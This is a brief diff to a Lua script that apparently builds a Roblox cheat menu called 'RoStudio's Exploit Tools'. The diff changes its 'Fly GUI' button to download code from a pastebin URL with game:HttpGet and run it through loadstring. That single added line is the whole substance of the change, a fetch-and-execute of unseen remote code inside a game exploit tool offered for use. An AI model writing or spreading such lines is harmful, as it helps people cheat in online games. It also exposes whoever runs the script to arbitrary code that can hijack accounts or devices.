@@ -5,5 +5,5 @@ local window = DrRayLibrary:Load("RoStudio's Exploit Tools", "Default")
 local tab = DrRayLibrary.newTab("Player", "ImageIdHere")
 
 tab.newButton("Fly GUI", "Test", function()
-    print('Hello!')
+loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
 end)
